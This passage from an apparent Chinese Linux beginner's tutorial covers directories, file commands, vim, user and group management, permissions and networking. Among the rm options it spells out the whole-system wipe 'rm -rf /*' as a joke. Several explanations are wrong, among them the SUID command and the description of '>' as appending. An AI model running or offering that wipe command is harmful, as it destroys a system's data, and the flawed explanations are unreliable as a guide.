suspend(进行挂起，待机状态)</p><p>Ctrl+Alt+backspace注销</p><p>清屏功能：clear或Ctrl+L</p><h2 id="改主机名"><a href="#改主机名" class="headerlink" title="改主机名"></a>改主机名</h2><p>修改主机名⤵</p><p>临时修改：hostname  <new-hostname>;su<br>永久修改：hostnamectl set-hostname <new-hostname>;su</p><h2 id="目录结构和文件类型"><a href="#目录结构和文件类型" class="headerlink" title="目录结构和文件类型"></a>目录结构和文件类型</h2><h3 id="🌈目录结构"><a href="#🌈目录结构" class="headerlink" title="🌈目录结构"></a>🌈目录结构</h3><blockquote><ul><li>&#x2F;：</li></ul><p>Linux文件系统最上层根目录，其他所有目录均是该目录的子目录</p><ul><li>&#x2F;bin：</li></ul><p>bin是Binary的缩写, 存放普通用户可执行程序或命令</p><ul><li>&#x2F;boot：</li></ul><p>这里存放的是启动Linux时使用的一些核心文件，系统启动时所需文件。</p><ul><li>&#x2F;dev ：</li></ul><p>dev是Device(设备)的缩写, 该目录下存放的是Linux的外部设备，在Linux中访问设备的方式和访问文件的方式是相同的。</p><ul><li>&#x2F;etc：</li></ul><p>这个目录用来存放所有的系统管理所需要的配置文件和子目录。</p><ul><li>&#x2F;home：</li></ul><p>用户的主目录，在Linux中，每个用户都有一个自己的目录，一般该目录名是以用户的账号命名的。</p><ul><li>&#x2F;lib：</li></ul><p>这个目录里存放着系统最基本的动态连接共享库，其作用类似于Windows里的DLL文件。几乎所有的应用程序都需要用到这些共享库。</p><ul><li>&#x2F;lost+found：</li></ul><p>这个目录一般情况下是空的，当系统非法关机后，这里就存放了一些文件。</p><ul><li>&#x2F;media：</li></ul><p>linux系统会自动识别一些设备，例如U盘、光驱等等，当识别后，linux会把识别的设备挂载到这个目录下。</p><ul><li>&#x2F;mnt：</li></ul><p>系统提供该目录是为了让用户临时挂载别的文件系统的，我们可以将光驱挂载在&#x2F;mnt&#x2F;上，然后进入该目录就可以查看光驱里的内容了。</p><ul><li>&#x2F;opt：</li></ul><p>这是给主机额外安装软件所摆放的目录。比如你安装一个ORACLE数据库则就可以放到这个目录下。默认是空的。</p><ul><li>&#x2F;proc：</li></ul><p>存放内核参数、硬件参数等相关信息。</p><ul><li>&#x2F;root：</li></ul><p>该目录为系统管理员，也称作超级权限者的用户主目录。</p><ul><li>&#x2F;sbin：</li></ul><p>s就是Super User的意思，这里存放的是系统管理员使用的系统管理程序。</p><ul><li>&#x2F;selinux：</li></ul><p>这个目录是Redhat&#x2F;CentOS所特有的目录，Selinux是一个安全机制，类似于windows的防火墙，但是这套机制比较复杂，这个目录就是存放selinux相关的文件的。</p><ul><li>&#x2F;srv：</li></ul><p>srv是服务（server）的缩写，该目录存放一些服务启动之后需要提取的数据。</p><ul><li>&#x2F;sys：</li></ul><p>本目录是内核一些映射文件，以供应用程序所用。</p><ul><li>&#x2F;tmp：</li></ul><p>这个目录是用来存放一些临时文件的。10天内未访问、未修改将自动从该目录删除。</p><ul><li>&#x2F;usr：</li></ul><p>这是一个非常重要的目录，用户的很多应用程序和文件都放在这个目录下，类似于windows下的program files目录。</p><ul><li>&#x2F;usr&#x2F;bin：</li></ul><p>系统用户使用的应用程序。</p><ul><li>&#x2F;usr&#x2F;sbin：</li></ul><p>超级用户使用的比较高级的管理程序和系统守护程序。</p><ul><li>&#x2F;usr&#x2F;src：</li></ul><p>内核源代码默认的放置目录。</p><ul><li>&#x2F;var：</li></ul><p>Variable缩写，这个目录中存放着在不断扩充着的东西，例如各种日志文件、经常变化的文件等。</p><ul><li>&#x2F;run：</li></ul><p>是一个临时文件系统，存储系统启动以来的信息。当系统重启时，这个目录下的文件应该被删掉或清除。</p></blockquote><h3 id="🌈文件类型"><a href="#🌈文件类型" class="headerlink" title="🌈文件类型"></a>🌈文件类型</h3><h4 id="普通文件"><a href="#普通文件" class="headerlink" title="普通文件"></a>普通文件</h4><ul><li>用于存放数据、程序等文件。”-“表示</li></ul><h4 id="目录文件"><a href="#目录文件" class="headerlink" title="目录文件"></a>目录文件</h4><ul><li>由一个目录所包含的目录项组成的文件目录文件。”d”表示</li></ul><h4 id="设备文件"><a href="#设备文件" class="headerlink" title="设备文件"></a>设备文件</h4><ul><li>用于与I&#x2F;O设备提供连接的一种文件，分为<ul><li>块设备文件：表示磁盘、光盘等设备。”b”表示</li><li>字符设备文件：联系按照字符进行操作终端、键盘等设备。”c”表示</li></ul></li></ul><h4 id="链接文件"><a href="#链接文件" class="headerlink" title="链接文件"></a>链接文件</h4><ul><li>指向另一个文件（源文件）的文件，用于不同目录下文件的共享和内容的同步。”l”表示</li></ul><h4 id="管道文件"><a href="#管道文件" class="headerlink" title="管道文件"></a>管道文件</h4><ul><li>主要用于在进程间传递数据。”p”表示</li></ul><h4 id="套接字文件"><a href="#套接字文件" class="headerlink" title="套接字文件"></a>套接字文件</h4><ul><li>套接字(socket)文件通常用于网络数据连接。”s”表示</li></ul><h4 id="共享存储器"><a href="#共享存储器" class="headerlink" title="共享存储器"></a>共享存储器</h4><p>“m”表示</p><h2 id="目录操作命令"><a href="#目录操作命令" class="headerlink" title="目录操作命令"></a>目录操作命令</h2><p>pwd：查看当前工作目录(print working directory)</p><p>cd：用来在不同的目录间进行切换</p><p>ll -a：列出当前目录下的文件，包括权限</p><p>ls：列出当前目录内容(list)</p><ul><li>-R列出当前目录及所有子目录的文件名</li><li>-hl显示文件目录大小</li></ul><p>tree：以树状图列出目录内容</p><ul><li>-C 在文件和目录清单加上色彩，便于区分各种类型</li><li>-d 显示目录名称而非内容</li><li>-f 在每个文件或目录之前，显示完整的相对路径名称</li><li>-p 列出权限标示</li><li>-s 列出文件或目录大小</li></ul><p>mkdir：创建目录(make directory)</p><ul><li>-p 创建子目录</li></ul><p>du：统计显示目录或文件空间占用量</p><ul><li>-sh：统计该目录下所有文件占用量</li></ul><h2 id="文件操作命令"><a href="#文件操作命令" class="headerlink" title="文件操作命令"></a>文件操作命令</h2><p>touch：新建空文件、修改日期</p><ul><li>-d：把文件的存取修改时间改为yyyy年mm月-dd日<ul><li>例：touch -d 20220301 f1</li></ul></li><li>-a：只把文件的存取时间改为当前时间</li><li>-m：只把文件的修改时间改为当前时间</li></ul><p>cp：复制(copy)</p><ul><li>-p：复制目标保持相同的权限、属性</li><li>-r：复制目录时必须用选项</li></ul><p>mv：移动文件目录(move)</p><ul><li>-p：移动后源文件不存在，相当于删除</li></ul><p>rmdir：删除空目录 </p><p>rm：删除文件或目录(remove)   </p><p><code>rm -rf /*   删库跑路命令</code></p><ul><li><p>-r：递归删除 </p></li><li><p>-f：强制删除</p></li><li><p>-i：删除时需要用户确认</p></li></ul><p>ln：建立链接(link)</p><p>用法：ln [选项] [源文件和目录]</p><ul><li><p>-s：建立符号链接(软链接),不加为硬链接</p><ul><li><p>例：echo ‘hello world’ &gt;f3#向下当前目录下的f3文件写入内容</p></li><li><p>ln f3 &#x2F;tmp&#x2F;test1#在&#x2F;tmp目录下创建f3硬链接文件test1</p></li><li><p>ln -s f3 &#x2F;tmp &#x2F;test2#在&#x2F;tmp目录下创建f3符号链接文件test2</p></li></ul></li></ul><p>find：查找文件或目录</p><p>例👩‍🦽</p><ul><li>find  &#x2F;etc-name ‘me*’  &#x2F;&#x2F;搜索etc目录中，所有文件以me开头的文件</li></ul><p>whereis：查找文件(只能用于查找二进制文件、源代码文件和man手册)</p><p>例</p><ul><li>whereis bash ：查看指令“bash”的位置</li></ul><h2 id="文件内容命令"><a href="#文件内容命令" class="headerlink" title="文件内容命令"></a>文件内容命令</h2><p>cat：显示文件内容</p><ul><li>-n：所有内容显示行号</li><li>-b：空行不标注行号</li></ul><p>more|less：适合较多文件查看</p><blockquote><p>more|less [选项] 文件名</p></blockquote><ul><li>-数字：指定分页的行数适用于more</li><li>-N：在每行添加行数适用于less</li><li>less：【space】向下移动一页，【B】向上移动一页，【Q】退出</li></ul><p>head和tail命令：查看文件开头或末尾部分内容</p><p>tail -c n 文件   ：显示文件最后n个字节</p><ul><li>-num 指定需要显示行数，默认10行<ul><li>例：head &#x2F;etc&#x2F;idmapd.conf&#x2F;&#x2F;显示文件的前10行内容</li><li>例：tail -20 &#x2F;etc&#x2F;passwd&#x2F;&#x2F;显示文件后20行内容</li></ul></li></ul><p>grep：检索、过滤文件内容</p><p>常用选项</p><ul><li>-i：查找内容时不区分大小写</li><li>例：grep ftp &#x2F;etc&#x2F;passwd&#x2F;&#x2F;在文件passwd中查找包含“ftp”的行</li><li>例：grep “^user1$” &#x2F;etc&#x2F;passwd&#x2F;&#x2F;在文件中搜索只含有’user1’五个字符的行</li></ul><p>条件表达式</p><p>“^”表示开头</p><p>“$”表示结尾</p><h2 id="压缩命令"><a href="#压缩命令" class="headerlink" title="压缩命令"></a>压缩命令</h2><h3 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h3><p>zip  【压缩文件名】 【 要压缩的文件】</p><p>zip  redhat.zip notepad.txt&#x2F;&#x2F;压缩单个文件</p><p>zip redhat.zip notepad.txt notepad1.txt&#x2F;&#x2F;压缩多个文件</p><h4 id="常用选项"><a href="#常用选项" class="headerlink" title="常用选项"></a>常用选项</h4><ul><li>-r&#x2F;&#x2F;指定目录下所有文件及子目录全部压缩</li><li>-v&#x2F;&#x2F;显示详细的压缩过程信息</li><li>-m&#x2F;&#x2F;将文件压缩之后，删除原文件</li></ul><p>unzip &#x2F;&#x2F;解压缩</p><ul><li>-l&#x2F;&#x2F;显示压缩文件内所包含文件</li><li>-d&#x2F;&#x2F;指定解压缩文件目录 <ul><li>例：unzip -d 【目录】【压缩包】</li></ul></li></ul><h3 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h3><p>tar [参数] [压缩文件名] [要压缩的文件]</p><p>tar -zcvf redhat.tar.gz notepad.txt&#x2F;&#x2F;压缩</p><p>tar -xvf  redhat.tar.gz&#x2F;&#x2F;解压</p><p>tar -tvf my_file.tar&#x2F;&#x2F;显示包文件中每个文件详情</p><p>tar -xf my_file.tar  -C &#x2F;test&#x2F;2&#x2F;&#x2F;将.tar压缩文件释放到&#x2F;test&#x2F;2目录下</p><h4 id="常用选项-1"><a href="#常用选项-1" class="headerlink" title="常用选项"></a>常用选项</h4><ul><li>-c创建一个包文件</li><li>-x提取包文件</li><li>-z以gzip格式压缩或解压文件</li><li>-v显示压缩或解压文件过程</li><li>-f指定被打包或解包文件</li><li>-C   释放到目标文件夹</li><li>-z   以gzip格式压缩或解压缩文件使用最广泛</li><li>-j   以bzip2格式压缩或解压缩文件</li><li>-J   使用xz格式压缩或解压缩文件</li></ul><h2 id="重定向符号"><a href="#重定向符号" class="headerlink" title="重定向符号"></a>重定向符号</h2><p>echo “hello world”&#x2F;&#x2F;将字符串’hello world’显示在屏幕上</p><p>echo “hello world” &gt; index.html&#x2F;&#x2F;将内容追加到文件中</p><p>echo “yes” &gt;index.html  &#x2F;&#x2F;在原有文件添加“yes”</p><p>cat f1 f2&gt;&gt;f12&#x2F;&#x2F;将f1 f2文件合并到f12</p><p>管道操作符号——‘|’</p><p>介绍：将前一个命令输出通过一个无形的管道作为下一个命令的输入，实现将前一个命令输出的数据结果作为后一个命令所需要的数据源参数</p><p>使用场景：</p><ul><li>ls -al &#x2F;etc |grep ftp</li><li>ls -al |more</li></ul><h2 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h2><h3 id="工作模式"><a href="#工作模式" class="headerlink" title="工作模式"></a>工作模式</h3><ol><li>命令模式（Command mode）</li><li>插入模式（lnsert mode）</li><li>末行模式（last line mode）</li></ol><h3 id="进入编辑模式"><a href="#进入编辑模式" class="headerlink" title="进入编辑模式"></a>进入编辑模式</h3><ul><li>i  #在当前光标位置处插入文本</li><li>l  #在当前行的开始处插入文本</li><li>a  #在当前光标位置之后插入文本   </li><li>A  #在当前行的结尾插入文本</li><li>o  #在当前光标位置的下一行插入一个新行并将光标移动到行首</li><li>O  #在当前光标所在行插入一个新行并将原光标所在行移至下一行</li></ul><h3 id="光标移动"><a href="#光标移动" class="headerlink" title="光标移动"></a>光标移动</h3><ul><li>k、j、h、l  #向上、下、左、右四个方向移动</li><li>⬆️、⬇️、⬅️、➡️  #光标向上、下、左、右四个方向移动</li><li>Home、End  #光标移动到行首、行尾</li><li>gg、G #光标移动文件内容的第一行、最后一行</li></ul><h3 id="字符串查找"><a href="#字符串查找" class="headerlink" title="字符串查找"></a>字符串查找</h3><blockquote><p>&#x2F; 字符串回车,向后查找指定内容</p><p>? 字符串回车,向前查找指定内容</p><p>n键定位到下一个匹配的字符</p><p>N键定位到上一个匹配的字符</p></blockquote><h3 id="常用编辑命令"><a href="#常用编辑命令" class="headerlink" title="常用编辑命令"></a>常用编辑命令</h3><h4 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h4><ul><li>x或del #删除光标所在位置的字符</li><li>dd #删除光标所在的行<ul><li>3dd #删除指从当前行开始向下删除三行</li></ul></li></ul><h4 id="复制"><a href="#复制" class="headerlink" title="复制"></a>复制</h4><ul><li>yy #复制当前行整行的内容到剪切板<ul><li>5yy #从光标处复制5行</li></ul></li></ul><h4 id="粘贴"><a href="#粘贴" class="headerlink" title="粘贴"></a>粘贴</h4><ul><li>P #将复制的文本插入到光标的后面<ul><li>p #将复制的内容插入到光标前面</li></ul></li></ul><h4 id="撤销编辑"><a href="#撤销编辑" class="headerlink" title="撤销编辑"></a>撤销编辑</h4><ul><li>u #按一次取消最近一次操作<ul><li>U #用于取消对当前行所做的所有编辑</li></ul></li></ul><h4 id="内容替换"><a href="#内容替换" class="headerlink" title="内容替换"></a>内容替换</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:% s/old/new/g在整个文章中替换所有字符串“old”替换为“new” </span><br><span class="line">:50,100s/man/MAN/gc要将50-100行中的man改为MAN</span><br></pre></td></tr></table></figure><h4 id="保存文件"><a href="#保存文件" class="headerlink" title="保存文件"></a>保存文件</h4><ul><li>:set nu#在编辑器显示行号 </li><li>:set nonu#取消行号显示</li><li>:q#退出vim。如果对文件进行了修改，vim不能退出，将返回编辑模式</li><li>:q!#放弃对文件内容的修改，并强制退出vim</li><li>:w#保存当前文件(如果对当前用户对该用户没有写入权限，保存会失败)</li><li>:wq或x#保存文件并退出vim</li><li>:w文件名#将当前文件另存为其他文件</li><li>:wq!#保存编辑强制退出</li></ul><h2 id="用户和组配置"><a href="#用户和组配置" class="headerlink" title="用户和组配置"></a>用户和组配置</h2><p>Linux系统中用户可分为：超级用户、系统用户、普通用户</p><ul><li>超级用户</li></ul><p>名为root的用户是系统中默认的超级用户，它在系统中的任务是对普通用户和整个系统进行管理。</p><ul><li>系统用户</li></ul><p>低权限用户，主要是为了维护系统或某些服务程序正常运行，这些用户一般不允许登录系统，例如：bin、daemon、ftp、mail等</p><ul><li>普通用户</li></ul><p>为了使用者能够使用linux系统资源而由root用户或其他管理员用户创建的用户，权限受到一定限制，一般只在自己的家目录中完全权限。</p><p>Linux系统中组可分为：基本组（主要组）、附加组（补充组）、系统组</p><ul><li>基本组</li></ul><p>建立用户时，若没有指定用户所属组，系统会建立一个和用户名想同的组，这个组就是基本组，基本组只能容纳一个用户，当其他用户加入改组，基本组就变成附加组。</p><ul><li>附加组</li></ul><p>可以容纳多个用户的组，组中的用户都具有组所拥有的权限</p><ul><li>系统组</li></ul><p>一般加入一些系统用户</p><h3 id="配置详情"><a href="#配置详情" class="headerlink" title="配置详情"></a>配置详情</h3><p>用户账号文件——&#x2F;etc&#x2F;passwd</p><p>密码文件——&#x2F;etc&#x2F;shadow</p><p>在linux系统中每个用户都在其中对应一行</p><p>例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">bin:x:1:1:bin:/bin:/sbin/nologin</span><br><span class="line">daemon:x:2:2:daemon:/sbin:/sbin/nologin</span><br><span class="line">adm:x:3:4:adm:/var/adm:/sbin/nologin</span><br></pre></td></tr></table></figure><ul><li>第一个字段：登录名称。必须是有效的用户名</li><li>第二个字段：加密格式保存密码的位置，现在密码保存在&#x2F;etc&#x2F;shadow文件中。此处只是密码占位符”x”或”*”。</li><li>第三个字符：用户ID号（UID号）。UID对用户是唯一的，系统内容用它来识别用户。</li><li>第四个字符：组ID，用户所属基本组的标识号（Group ldentify,GID号）</li><li>第五个字符：用户的全名或描述，可以是任意文本，通常填写一些个人信息。</li><li>第六个字符：用户家目录，该用户初始登录系统之后所处的目录</li><li>第七个字符：用户登录后所使用的shell或不能登录的&#x2F;sbin&#x2F;nologin标识。</li></ul><p>组账号文件——&#x2F;etc&#x2F;group</p><p>&#x2F;etc&#x2F;group文件用于存放组账号的基本信息</p><p>例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:</span><br><span class="line">bin:x:1:</span><br><span class="line">daemon:x:2:</span><br></pre></td></tr></table></figure><ul><li>第一个字段：组名称</li><li>第二个字段：加密密码，用x表示，一般未设置组密码</li><li>第三个字段：组ID号，也是一个整数，系统内部用来标识组</li><li>第四个字段：组成员列表</li></ul><h3 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h3><h4 id="useradd命令"><a href="#useradd命令" class="headerlink" title="useradd命令"></a>useradd命令</h4><p><code>useradd【选项】 用户名</code></p><ul><li><p>-c&#x2F;&#x2F;注释信息，用户相关说明</p></li><li><p>-d&#x2F;&#x2F;设定用户家目录默认&#x2F;home&#x2F;用户名</p></li><li><p>-e&#x2F;&#x2F;YYYY-MM-DD设置用户被禁用日期，此日期后将不能使用该用户</p></li><li><p>-f&#x2F;&#x2F;天数，指定密码到期后多少天用户被禁用，若为0，则表示用户到期后被立即禁用，若指定为-1，则表示用户过期后不被禁用（即密码永不过期）</p></li><li><p>-g&#x2F;&#x2F;组名或GID号-用户指定所属的基本组，该组在指定时必须存在</p></li><li><p>-G&#x2F;&#x2F;组名或GID号列表-用户指定所属的附加组，各组在指定时已存在，附加组可以有多个，组之间用”,”分隔。</p></li><li><p>-M&#x2F;&#x2F;不创建用户家目录</p></li><li><p>-N&#x2F;&#x2F;不创建与用户名同名的基本组，而是将用户添加到-g选项指定的组</p></li><li><p>-p&#x2F;&#x2F;密码，指定用户的登录密码。</p></li><li><p>-s&#x2F;&#x2F;shell名，指定用户登录后使用的shell,默认时bash。</p></li><li><p>-u&#x2F;&#x2F;用户名，设置用户的UID，默认是已有用户的最大UID加1.如果同时有-o选项，则可以重复使用其他用户标识号。</p></li></ul><h4 id="usermod命令"><a href="#usermod命令" class="headerlink" title="usermod命令"></a>usermod命令</h4><p>修改用户的属性</p><p><code>usermod 【选项】 用户名</code></p><ul><li>-l&#x2F;&#x2F;更改用户名称，须在该用户未登录的情况下使用。</li><li>-L&#x2F;&#x2F;锁定（暂停）用户，使其不能登录使用。</li><li>-U&#x2F;&#x2F;解锁用户。</li></ul><h4 id="userdel命令"><a href="#userdel命令" class="headerlink" title="userdel命令"></a>userdel命令</h4><p>删除用户</p><p>userdel 【-r】 用户名</p><ul><li>-r&#x2F;&#x2F;删除用户时把用户的家目录和邮箱池一起删除</li></ul><h4 id="su命令"><a href="#su命令" class="headerlink" title="su命令"></a>su命令</h4><p>切换用户 </p><p>su –l test    #从 root 用户 切换成 test 用户</p><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>1.新建一个用户wang6,指定其UID为1006、登录shell为&#x2F;bin&#x2F;bash、密码为123.com,账号永不过期。</p><p><code>[root@jw2031-122 ~]# useradd -u 1006 -s /bin/bash -p 123.com -f -1 wang6</code></p><p>2.新建一个辅助管理员用户admin,将其用户家目录指定为&#x2F;admin,基本组指定为wheel,附加组为adm组和root组。</p><p><code>[root@jw2031-122 ~]# useradd -d /admin -g wheel -G adm,root admin</code></p><p>3.新建一个用于访问FTP的用户zhao6,禁止其登录不创建家目录。</p><p><code>[root@jw2031-122 ~]# useradd -M -s/sbin/nologin zhao6</code></p><ul><li><p>useradd test&#x2F;&#x2F;添加一个名称为 test 用户</p></li><li><p>passwd test&#x2F;&#x2F;给刚创建用户 test 设置密码</p></li><li><p>userdel test&#x2F;&#x2F;删除 test 用户</p></li><li><p>userdel –r test&#x2F;&#x2F;连用户的主目录一起删除</p></li></ul><h3 id="组的管理"><a href="#组的管理" class="headerlink" title="组的管理"></a>组的管理</h3><h4 id="groupadd命令"><a href="#groupadd命令" class="headerlink" title="groupadd命令"></a>groupadd命令</h4><p><code>groupadd 【选项】 组名</code></p><ul><li>-g GID&#x2F;&#x2F;指定新建组的组ID</li><li>-r&#x2F;&#x2F;建立一个系统组，与-g不同时使用时，则分配一个1-999的GID</li></ul><p>示例：</p><p>向系统组中添加一个组ID为1010，组名为group1的新组。</p><p><code>[root@jw2031-122 ~]# groupadd -g 1010 group1</code></p><h4 id="gpasswd命令"><a href="#gpasswd命令" class="headerlink" title="gpasswd命令"></a>gpasswd命令</h4><p>添加&#x2F;删除组成员</p><p>gpasswd 【选项】【用户】【组】</p><ul><li>-a&#x2F;&#x2F;用户名，把用户名加入组。</li><li>-d&#x2F;&#x2F;用户名，把用户名从组中删除</li><li>-M&#x2F;&#x2F;用户列表，向组中同时添加多个用户，多个用户名之间用“，”隔开</li><li>-A&#x2F;&#x2F;用户名，给组指派管理员</li></ul><p>示例：</p><p>将zhang3、li4用户同时加入group1组，并指派zhang3为管理员。</p><p><code>[root@jw2031-122 ~]# gpasswd -M zhang3,li4 group1</code></p><p><code>[root@jw2031-122 ~]# gpasswd -A zhang3 group1</code></p><h4 id="groupmod命令"><a href="#groupmod命令" class="headerlink" title="groupmod命令"></a>groupmod命令</h4><p>groupmod [选项] 组名</p><ul><li>-gGID新号，更改组的GID</li><li>-n新组名，更改组的名字</li></ul><p>示例：</p><p>将组group1的GID修改为2000，组名修改为group11</p><p><code>[root@jw2031-122 ~]# groupmod -g 2000 -n group11 group1</code></p><h4 id="groupdel命令"><a href="#groupdel命令" class="headerlink" title="groupdel命令"></a>groupdel命令</h4><p>删除组</p><p><code>groupdel组名</code></p><h3 id="用户和组信息显示"><a href="#用户和组信息显示" class="headerlink" title="用户和组信息显示"></a>用户和组信息显示</h3><p>w  或者 who、users&#x2F;&#x2F;查看当前登录用户</p><p>whoami &#x2F;&#x2F;查看当前用户</p><p>id【用户名】&#x2F;&#x2F;显示当前用户或指定用户的ID,以及所属组的ID</p><p>groups 【用户名】&#x2F;&#x2F;显示当前用户或指定用户所属组的信息</p><p>last 、lastlog &#x2F;&#x2F;查看用户登入信息</p><h2 id="文件和目录权限"><a href="#文件和目录权限" class="headerlink" title="文件和目录权限"></a>文件和目录权限</h2><h3 id="配置详情-1"><a href="#配置详情-1" class="headerlink" title="配置详情"></a>配置详情</h3><p>文件或目录的详情分为七栏显示。</p><p>例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">drwxr-xr-x. 2 root root    6 2月  27 22:04 Music</span><br><span class="line">分解✁</span><br><span class="line">第一栏：</span><br><span class="line">d——文件类型       </span><br><span class="line">rwxr-xr-x. ——访问权限    </span><br><span class="line">第二栏：</span><br><span class="line">2——文件数</span><br><span class="line">第三栏：</span><br><span class="line">root——属主</span><br><span class="line">第四栏：</span><br><span class="line">root——属组</span><br><span class="line">第五栏：</span><br><span class="line">6——文件大小</span><br><span class="line">第六栏：</span><br><span class="line">2月 27 22：04——建档日期的时间</span><br><span class="line">第七栏：</span><br><span class="line">Music——文件名</span><br></pre></td></tr></table></figure><p>第一栏共（11）位是文件类型和访问权限由五部分组成</p><p>例：</p><center><p>drwxr-xr-x.</p></center><p>第一个字符：文件类型</p><p><strong>第二至四字符：该文件属主用户（文件所有者）对该文件的访问权限</strong></p><p><strong>第五至七字符：该文件属组用户和对该文件访问权限</strong></p><p><strong>第八至十字符：其他用户对该文件的访问权限</strong></p><p>第十一字符：是否有一个可替换访问控制措施应用在该文件中；</p><ul><li>为空格时表示系统没有可替换访问控制措施；</li><li>为”.”时，该文件使用了selinux安全上下文，未使用其他访问控制措施；</li><li>为”+”时，该文件使用selinux安全上下文同时，还混用了其他访问控制措施（如：访问控制列表ACL）。</li></ul><h4 id="chmod命令"><a href="#chmod命令" class="headerlink" title="chmod命令"></a>chmod命令</h4><p>Chmod命令用于修改、设置文件权限修改方法：字母法、数字法</p><h5 id="字母法"><a href="#字母法" class="headerlink" title="字母法"></a>字母法</h5><ul><li>字母法：chmod [选项] [ugoa] 【+|-|&#x3D;】 [rwx] 文件或目录……</li></ul><p>下面先介绍这些参数意义：</p><p>1.ugoa——表示权限设置所针对的用户类别，可以是字母中的一个或组合。</p><ul><li>u(user)表示文件或目录的属主(所有者)</li><li>g(group)表示属组内的用户</li><li>o(others)表示其他任何用户</li><li>a(all)表示所有用户(即u+g+o)</li></ul><p>2.【+|-|&#x3D;】——表示设置权限的操作动作，’+’代表添加某个权限，’-‘代表取消某个权限，’&#x3D;’代表只赋予给定的权限，并取消原有权限。</p><p>3.rwx——用字符形式表示的所设置的权限，可以是一个字母中一个或组合</p><p>4.nnn——用三位八进制数字表示所设置权限</p><p>选项：</p><p>-R——递归修改指定目录下所有文件、子目录的权限。</p><p>例：</p><p>创建查看文件file1.txt，为文件所有者添加可执行的权限，为组内用户设置可写和可执行权限，为其他人添加可写权限，最后设置file1.txt文件的权限为’-rwx-wxrw-‘</p><p><code>[root@jw2031-122 ~]# chmod u+x,g=wx,o+w file1.txt</code></p><h5 id="数字法"><a href="#数字法" class="headerlink" title="数字法"></a>数字法</h5><ul><li>数字法：chmod+数字组合+文件名</li></ul><p>数字组合一般包含三个数字：</p><p>第一个数字对应用户u(user)</p><p>第二个数字对应用户g(group)</p><p>第三个数字对应用户o(other)</p><p>另外r(read)——4，w(write)——2，x(excute)——1</p><p>例：</p><p>数字法：chmod 765 file1.txt</p><p>对应字母法：chmod u+rwx,g&#x3D;rw,o+rx file1.txt</p><h3 id="特殊权限"><a href="#特殊权限" class="headerlink" title="特殊权限"></a>特殊权限</h3><h4 id="sticky-bit"><a href="#sticky-bit" class="headerlink" title="sticky bit"></a>sticky bit</h4><p>sticky bit只对目录有效，使目录下的文件，只有文件拥有者才能删除（如果他不属于owner，仅属于group或者other，就算他有w权限，也不能删除文件）。</p><p>  加sticky bit的方法：</p><p>  <code>chmod o+t /tmp或者</code></p><p>  <code>chmod 1777 /tmp</code></p><p> 查看是否加了sticky bit，用ls -l，可以看到有类似这样的权限：“-rwxrwxrwt”，t就代表已经加上了sticky bit，而且生效了，如果显示的是“-rwxrwxrwT”，说明也已经加上了sticky bit，但没有生效（因为本来other就没有写的权限）。</p><h4 id="SGID-The-Set-GroupID"><a href="#SGID-The-Set-GroupID" class="headerlink" title="SGID(The Set GroupID )"></a>SGID(The Set GroupID )</h4><p>  加上SGID的文件，表示运行这个程序时，是临时以这个文件的拥有组的身份运行的；加上SGID的文件夹，表示在这个目录下创建的文件属于目录所有的组，而不是创建人所在的组，在这个目录下创建的目录继承本目录的SGID。</p><p>  加SGID的方法：</p><p>  <code>chmod g+s /tmp或</code></p><p>  <code>chmod 2777 /tmp</code></p><p>  查看是否加了SGID，用ls -l，可以看到类似这样的权限“drwxrwsrwx”，s就代表已经加上了SGID，而且生效，如果显示“drwxrwSrwx”，说明已经加上了SGID，但没有生效（因为本来group就没有执行的权限）。</p><h4 id="SUID-The-Set-UserID"><a href="#SUID-The-Set-UserID" class="headerlink" title="SUID(The Set UserID)"></a>SUID(The Set UserID)</h4><p> SUID与SGID是一样的，惟一不同的是，运行时是以这个文件的拥有者身份来运行。</p><p>  加SUID的方法：</p><p>  <code>chmod o+s /tmp或</code></p><p>  <code>chmod 4777 /tmp</code></p><p>  同样的，加了SUID的文件权限有这类似这两种：“drwsrwxrwx”、“drwSrwxrwx”。</p><h3 id="文件目录默认权限"><a href="#文件目录默认权限" class="headerlink" title="文件目录默认权限"></a>文件目录默认权限</h3><p>新建文件的默认权限&#x3D;666-umask值</p><p>新建目录的默认权限&#x3D;777-umask值</p><p>umask#查看默认umask值</p><h2 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h2><p>ip addr&#x2F;&#x2F;查看当前的网卡</p><p>ifconfig &#x2F;&#x2F;查看IP地址 : </p><p>ip link&#x2F;&#x2F;比较新鲜的  </p><p>netstar&#x2F;ss&#x2F;&#x2F;查看网络连接数</p><p>ping &#x2F;hping3&#x2F;&#x2F;查看网络延迟</p><p>route&#x2F; traceroute&#x2F;&#x2F;路由，查询路由表</p><p>dig &#x2F; nslookup &#x2F;&#x2F;查看DNS解析 </p><p>ptables &#x2F;&#x2F;排查防火墙</p><p>tcpdump  &#x2F;Wireshark&#x2F;&#x2F;网络抓包</p><h2 id="进程和系统"><a href="#进程和系统" class="headerlink" title="进程和系统"></a>进程和系统</h2><p>ps&#x2F;&#x2F;查看当前终端活动进程</p><ul><li>-ef&#x2F;&#x2F;显示系统中所有进程</li><li>-lu&#x2F;&#x2F;显示指定用户</li><li>aux&#x2F;&#x2F;查看各个进程占用CPU及内存情况</li></ul><p>[root@zs ~]# pstree -p |grep httpd&#x2F;&#x2F;查看搜索httpd进程</p><p>[root@zs 